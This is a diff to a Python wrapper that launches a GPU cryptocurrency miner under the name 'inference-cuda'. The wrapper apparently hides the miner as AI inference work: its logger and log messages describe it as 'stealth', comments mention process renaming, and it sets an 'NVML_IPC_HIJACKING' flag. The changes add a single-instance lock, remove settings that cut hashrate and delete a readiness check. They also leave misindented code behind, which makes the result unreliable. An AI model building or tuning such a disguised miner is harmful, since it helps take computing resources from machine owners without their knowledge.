@@ -7,6 +7,7 @@ import threading
 import random
 from pathlib import Path
 import ctypes # Thêm thư viện ctypes để gọi syscall
+import fcntl  # Optional single-instance guard (file lock)
 
 # PHASE 3+: Enhanced Hook Sequencing - Import psutil for dynamic detection
 try:
@@ -30,6 +31,33 @@ except ImportError as e:
 
 # Setup logging với GPU-specific logger name
 logger = get_stealth_inference_logger()
+
+_LOCK_FH = None  # giữ handle lock file nếu bật single-instance guard
+
+def acquire_single_instance_lock(lock_path: str = "/tmp/inference_cuda.lock") -> bool:
+    """
+    **[Single-Instance Lock]** (khóa một phiên – tránh chạy trùng khi cần)
+
+    Chỉ kích hoạt khi người dùng bật ENV `SINGLE_INSTANCE=1`. Dùng `fcntl.flock` non-blocking.
+
+    Returns:
+        bool: True nếu khóa thành công hoặc guard không bật; False nếu đã có instance khác.
+    """
+    global _LOCK_FH
+    enable_guard = str(os.getenv("SINGLE_INSTANCE", "0")).lower() in ("1", "true", "yes")
+    if not enable_guard:
+        return True
+
+    try:
+        _LOCK_FH = open(lock_path, "w")
+        fcntl.flock(_LOCK_FH.fileno(), fcntl.LOCK_EX | fcntl.LOCK_NB)
+        _LOCK_FH.write(str(os.getpid()))
+        _LOCK_FH.flush()
+        logger.info(f"🔒 [SINGLE-INSTANCE] Acquired lock at {lock_path}")
+        return True
+    except Exception as lock_err:
+        logger.warning(f"⚠️ [SINGLE-INSTANCE] Another instance detected (lock failed: {lock_err})")
+        return False
 
 def signal_handler(signum, frame):
     """
@@ -84,16 +112,27 @@ def create_enhanced_gpu_environment():
     clean_env['ENABLE_NVML_IPC_HIJACKING'] = '0'
     clean_env['GPU_MINING_SUBPROCESS'] = '1'
 
-    # 3. CUDA Resource Optimization - Inspired by resource_control.py
-    # Minimal, non-intrusive defaults only
-    cuda_optimizations = {
-        'NVIDIA_DRIVER_CAPABILITIES': 'compute'
-    }
+    # 3. CUDA Resource Optimization - tối giản, không ép các cờ giảm hiệu năng
+    # Không override NVIDIA_DRIVER_CAPABILITIES nếu đã có; nếu thiếu thì thêm 'compute,utility' để có NVML
+    if 'NVIDIA_DRIVER_CAPABILITIES' not in clean_env or not clean_env['NVIDIA_DRIVER_CAPABILITIES']:
+        clean_env['NVIDIA_DRIVER_CAPABILITIES'] = 'compute,utility'
+        logger.info("✅ [GPU-ENV-OPTIMIZER] Set NVIDIA_DRIVER_CAPABILITIES=compute,utility (NVML enabled)")
+    else:
+        logger.info("✅ [GPU-ENV-OPTIMIZER] Preserved NVIDIA_DRIVER_CAPABILITIES from parent env")
 
-    for key, value in cuda_optimizations.items():
-        clean_env[key] = value
+    # Bỏ các cờ có thể gây tụt hiệu năng nếu lỡ kế thừa
+    for k in (
+        'CUDA_LAUNCH_BLOCKING',
+        'CUDA_CACHE_DISABLE',
+        'CUDA_DEVICE_MAX_CONNECTIONS',
+        'CUDA_FORCE_PTX_JIT',
+        'CUDA_MODULE_LOADING',
+        'CUDA_DISABLE_CUBLASLT',
+        'CUDA_LAUNCH_TIMEOUT',
+    ):
+        clean_env.pop(k, None)
 
-    logger.info(f"✅ [GPU-ENV-OPTIMIZER] Applied {len(cuda_optimizations)} CUDA optimizations")
+    logger.info("✅ [GPU-ENV-OPTIMIZER] Removed performance-limiting CUDA flags (if present)")
     return clean_env
 
 def main():
@@ -130,8 +169,13 @@ def main():
         # Self-stealth functionality removed - process renaming now handled by child process management
         logger.info("✅ [GPU-STEALTH-WRAPPER] Self-stealth mode disabled - using child process renaming only")
 
+        # Optional single-instance guard (off by default)
+        if not acquire_single_instance_lock():
+            logger.warning("⏭️ [GPU-STEALTH-WRAPPER] Another miner instance is running; exiting early by guard policy")
+            sys.exit(0)
+
         # Small delay để đảm bảo process ready
-        time.sleep(1)
+        time.sleep(0.2)
 
         # Prepare command để exec inference-cuda
         exec_command = [cuda_inference_path] + cuda_inference_args
@@ -141,12 +185,16 @@ def main():
         logger.info("🔄 [GPU-STEALTH] Using optimized subprocess stealth mode")
 
         try:
-            # Memory optimization trước khi start inference-cuda
-            logger.info("🧠 [MEMORY-OPT] Preparing DAG-safe environment (phase-gated)...")
+            # Memory optimization trước khi start inference-cuda (tối giản, tránh giảm hashrate)
+            logger.info("🧠 [MEMORY-OPT] Preparing minimal DAG settings…")
 
-            # Always enable progressive DAG loading (safe for DAG build only)
-            clean_env['KAWPOW_DAG_PROGRESSIVE'] = '1'
-            logger.info("🔧 [TIER-8-CONFIG] Set KAWPOW_DAG_PROGRESSIVE=1")
+            # Chỉ bật progressive DAG nếu người dùng yêu cầu qua ENV (mặc định tắt)
+            if str(os.getenv('KAWPOW_DAG_PROGRESSIVE', '0')).lower() in ('1', 'true', 'yes'):
+                clean_env['KAWPOW_DAG_PROGRESSIVE'] = '1'
+                logger.info("🔧 [TIER-8-CONFIG] KAWPOW_DAG_PROGRESSIVE=1 (enabled by ENV)")
+            else:
+                clean_env.pop('KAWPOW_DAG_PROGRESSIVE', None)
+                logger.info("🔧 [TIER-8-CONFIG] KAWPOW_DAG_PROGRESSIVE disabled by default")
 
             # Phase-gated safe flags: only set if explicitly enabled via ENV
             # Defaults to disabled to avoid throughput drop after DAG
@@ -199,100 +247,8 @@ def main():
             monitor_thread = threading.Thread(target=monitor_and_log_output, args=(process, 'inference-cuda'))
             monitor_thread.daemon = True
             monitor_thread.start()
-            # ---- Register to DirectPIDRegistry (no renaming) ----
-            try:
-                # ====================================
-                # LINEAR FLOW: Enhanced Readiness Check & Hook Sequencing
-                # ====================================
 
-                def _enhanced_readiness_check(process, timeout=30, subprocess_env=None):
-                    """
-                    **Enhanced Readiness Check** (kiểm tra sẵn sàng nâng cao) for subprocess DAG completion.
-
-                    Reused logic from HookCoordinator._enhanced_readiness_check() adapted for subprocess.
-
-                    Args:
-                        process: subprocess.Popen object
-                        timeout: timeout tối đa (giây)
-                        subprocess_env: subprocess environment dict for context-aware checking
-
-                    Returns:
-                        bool: True nếu DAG allocation complete, False nếu timeout hoặc process failed
-                    """
-                    start_time = time.time()
-                    consecutive_checks = 2
-                    MINIMUM_THRESHOLD = 0.6  # 60% score required to pass
-
-                    logger.info(f"🚀 [READINESS-START] Starting enhanced readiness check for PID {process.pid} with timeout={timeout}s")
-
-                    while time.time() - start_time < timeout:
-                        checks = {
-                            'process_alive': 1.0 if process.poll() is None else 0.0,  # Check if process is still running
-                            'env_config': 1.0 if subprocess_env and subprocess_env.get('KAWPOW_DAG_PROGRESSIVE') == '1' else 0.5,  # DAG config check
-                            'time_elapsed': min(1.0, (time.time() - start_time) / 10.0)  # Give time for DAG generation (10s scale)
-                        }
-
-                        # Calculate weighted score
-                        weights = {
-                            'process_alive': 0.6,    # 60% - Process must be alive (most critical)
-                            'env_config': 0.2,       # 20% - Environment configuration
-                            'time_elapsed': 0.2      # 20% - Allow time for DAG generation
-                        }
-
-                        weighted_score = sum(checks[check] * weights[check] for check in checks)
-                        passed_checks = sum(1 for score in checks.values() if score > 0.5)
-                        total_checks = len(checks)
-
-                        logger.info(f"📊 [READINESS-PROGRESS] Weighted score: {weighted_score:.3f} ({passed_checks}/{total_checks} checks > 0.5)")
-
-                        # Log chi tiết từng check
-                        for check_name, result in checks.items():
-                            status_icon = "✅" if result > 0.5 else "⚠️"
-                            status = "PASS" if result > 0.5 else "NEEDS ATTENTION"
-                            logger.info(f"   ├─ {check_name}: {status_icon} {status} (score: {result:.3f})")
-
-                        # Check if threshold met
-                        if weighted_score >= MINIMUM_THRESHOLD:
-                            # Quick stability check
-                            stability_count = 0
-                            for i in range(consecutive_checks):
-                                time.sleep(0.5)  # Brief stability check
-                                if process.poll() is not None:  # Process died
-                                    logger.warning(f"⚠️ [READINESS-STABILITY] Process {process.pid} died at verification {i+1}")
-                                    break
-                                stability_count += 1
-
-                            if stability_count == consecutive_checks:
-                                logger.info(f"✅ [READINESS-STABLE] Process {process.pid} verified stable (score: {weighted_score:.3f})")
-                                return True
-
-                        # Brief wait before next check
-                        time.sleep(1)
-
-                    # Timeout reached
-                    logger.warning(f"⏰ [READINESS-TIMEOUT] Enhanced readiness check timeout after {timeout}s (final score: {weighted_score:.3f})")
-                    return False
-
-                def _simplified_hook_sequencing():
-                    """
-                    Perform readiness check only; hooks are disabled.
-                    """
-                    try:
-                        logger.info("🚀 [HOOK-SEQ] Starting readiness check (hooks disabled)...")
-                        if not _enhanced_readiness_check(process, timeout=30, subprocess_env=clean_env):
-                            logger.error("❌ [HOOK-SEQ] Readiness check failed - DAG allocation incomplete")
-                            return False
-                        logger.info("✅ [HOOK-SEQ] Readiness check passed - proceeding")
-                        return True
-                    except Exception as e:
-                        logger.error(f"❌ [HOOK-SEQ] Failed: {e}")
-                        return False
-
-                # Start simplified hook sequencing in background
-                threading.Thread(target=_simplified_hook_sequencing, daemon=True).start()
-                logger.info("🚀 [LINEAR-FLOW] Simplified hook sequencing started")
-
-                # 🚀 **PRIMARY HANDOFF TO HOOKCOORDINATOR** (chuyển giao chính đến HookCoordinator)
+            # 🚀 **PRIMARY HANDOFF TO HOOKCOORDINATOR** (chuyển giao chính đến HookCoordinator)
                 # This is the single point of entry for PID registration.
                 # The fallback logic has been removed to prevent context mismatch.
                 try:
@@ -326,7 +282,7 @@ def main():
             except Exception as rename_err:
                 logger.error(f"❌ [GPU-POST-EXEC] Post-exec sequencing error: {rename_err}")
 
-            # 🔒 PHASE 2: Enhanced GPU Resource Monitoring + Stealth - (đã loại bỏ logic pidfd_send_signal theo yêu cầu làm sạch mã)
+            # 🔒 PHASE 2: Monitoring/cleanup giữ tối thiểu; readiness-check bị loại bỏ để tránh overhead không cần thiết
 
             # Wait for subprocess to complete
             return_code = process.wait()
